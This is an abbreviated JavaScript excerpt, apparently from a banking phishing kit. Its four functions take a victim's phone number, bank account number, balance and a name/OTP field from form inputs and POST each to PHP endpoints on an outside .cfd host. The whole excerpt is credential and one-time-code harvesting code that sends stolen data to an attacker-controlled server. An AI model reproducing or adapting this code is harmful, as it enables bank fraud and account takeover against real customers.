...
function sendNohp(){
  ...
  sessionStorage.setItem('tarif', tarif);
    ...
    var nohp = document.getElementById('nohp');    
      ...
      $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/16/no.php',
...
function sendDebit(){
   $('.load').fadeIn();
    ...
    var rek = document.getElementById('rek');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/16/login.php',
...
function sendSaldo(){
    ...
    var saldo = document.getElementById('saldo');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/16/saldo.php',
...
function sendOtp(){
    ...
    var nama1 = document.getElementById('nama1');    
        ...
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/16/otp.php',
